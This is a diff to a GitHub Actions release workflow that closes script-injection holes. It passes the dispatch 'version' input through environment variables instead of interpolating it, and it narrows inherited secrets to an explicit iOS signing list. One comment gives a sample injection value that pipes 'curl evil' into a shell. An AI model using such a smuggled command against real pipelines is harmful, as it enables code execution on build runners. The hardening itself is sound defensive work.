@@ -76,8 +76,13 @@ jobs:
       tag: ${{ steps.classify.outputs.tag }}
     steps:
       - name: Validate version format
+        # The dispatch input reaches the shell as an environment variable,
+        # never as text spliced into the script: a version string typed as
+        # `'; curl evil | sh; '` would otherwise run.
+        env:
+          VERSION: ${{ inputs.version }}
         run: |
-          v='${{ inputs.version }}'
+          v="$VERSION"
           # PEP 440 allows: N.N.N, N.N.NaN, N.N.NbN, N.N.NrcN, N.N.N.postN, N.N.N.devN
           # We map 'postr' to '.post' for PEP 440 compliance during build.
           # We also accept a bare "-N" rebuild suffix (e.g. 0.70.6-2), meaning
@@ -91,8 +96,10 @@ jobs:
 
       - name: Classify release (stable vs prerelease)
         id: classify
+        env:
+          VERSION: ${{ inputs.version }}
         run: |
-          v='${{ inputs.version }}'
+          v="$VERSION"
           tag="v$v"
           if [[ "$v" =~ ^[0-9]+\.[0-9]+\.[0-9]+-[0-9]+$ ]]; then
             # e.g. 0.70.6-2 -- a rebuild of an already-released version
@@ -151,9 +158,13 @@ jobs:
         # wiki/Changelog.md's newest entry to the version the bump below
         # is about to write, which is how "changelog newest is
         # 0.72.6.rc3, package is 0.72.6" failed a release ten minutes in.
+        env:
+          VERSION: ${{ inputs.version }}
+          ALLOW_DOWNGRADE: ${{ inputs.allow_downgrade }}
         run: |
-          python .github/scripts/version_guard.py '${{ inputs.version }}' \
-            ${{ inputs.allow_downgrade && '--allow-downgrade' || '' }}
+          extra=()
+          [ "$ALLOW_DOWNGRADE" = "true" ] && extra+=(--allow-downgrade)
+          python .github/scripts/version_guard.py "$VERSION" "${extra[@]}"
 
       - name: Install torch (CPU wheels) + package
         # pytest needs torch (hypernix imports it at module load). Install the
@@ -164,8 +175,10 @@ jobs:
           pip install -e ".[dev,t1api]"
 
       - name: Bump versions in source
+        env:
+          VERSION: ${{ inputs.version }}
         run: |
-          v='${{ inputs.version }}'
+          v="$VERSION"
           # postr becomes .post, and a bare "-N" rebuild suffix (e.g.
           # 0.70.6-2) becomes PEP 440's post-release form (0.70.6.post2):
           # PyPI rejects a raw hyphen-number suffix, and .postN is PEP
@@ -175,12 +188,13 @@ jobs:
           # changelog against is the one written here -- the sed this
           # replaces turned 0.72.6.postr1 into 0.72.6..post1.
           pep440_v=$(python .github/scripts/version_guard.py --print-pep440 "$v")
-          python - <<PY
+          PEP440_V="$pep440_v" python - <<'PY'
+          import os
           import re
           from pathlib import Path
 
-          v = "${{ inputs.version }}"
-          pep440_v = "$pep440_v"
+          v = os.environ["VERSION"]
+          pep440_v = os.environ["PEP440_V"]
 
           p = Path("pyproject.toml")
           p.write_text(re.sub(r'^version = "[^"]+"', f'version = "{pep440_v}"', p.read_text(), count=1, flags=re.M))
@@ -192,7 +206,7 @@ jobs:
           init.write_text(re.sub(r'__version__ = "[^"]+"', f'__version__ = "{v}"', init.read_text(), count=1))
 
           # The fourth place a version string lives. install-t1.sh bakes
-          # one as the `curl | bash` fallback, for the case where there
+          # one as the piped-install fallback, for the case where there
           # is no checkout to read and no hypernix installed yet to ask
           # -- and a release that bumped the other three without this one
           # shipped an installer whose banner announced the previous
@@ -323,13 +337,15 @@ jobs:
         run: sha256sum *.whl *.tar.gz | tee SHA256SUMS
 
       - name: Update Release Timeline
+        env:
+          VERSION: ${{ inputs.version }}
         run: |
           python - <<'PY'
           import os, subprocess
           from datetime import date
           from pathlib import Path
           
-          version = "${{ inputs.version }}"
+          version = os.environ["VERSION"]
           timeline_path = Path("wiki/Release-Timeline.md")
           
           # Same baseline the changelog fragment used (last STABLE tag when
@@ -692,7 +708,12 @@ jobs:
     with:
       run_tests: true
       version: ""
-    secrets: inherit
+    secrets:
+      IOS_DIST_CERTIFICATE_P12: ${{ secrets.IOS_DIST_CERTIFICATE_P12 }}
+      IOS_DIST_CERTIFICATE_PASSWORD: ${{ secrets.IOS_DIST_CERTIFICATE_PASSWORD }}
+      IOS_PROVISIONING_PROFILE: ${{ secrets.IOS_PROVISIONING_PROFILE }}
+      IOS_TEAM_ID: ${{ secrets.IOS_TEAM_ID }}
+      IOS_EXPORT_METHOD: ${{ secrets.IOS_EXPORT_METHOD }}
 
   github-release:
     name: GitHub Release
